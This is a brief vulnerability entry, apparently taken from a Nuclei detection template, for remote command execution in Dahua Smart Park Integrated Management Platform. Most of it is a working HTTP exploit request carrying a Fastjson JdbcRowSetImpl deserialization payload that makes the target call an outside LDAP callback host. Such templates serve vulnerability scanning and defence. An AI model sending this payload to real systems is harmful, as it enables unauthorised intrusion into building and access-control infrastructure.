# Vulnerability: Dahua Smart Park Integrated Management Platform - Remote Command Execution
**Classification:** RCE
**Source:** Nuclei Template (`dahua-wpms-rce.yaml`)

## Description
Dahua Smart Park Integrated Management Platform is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
```

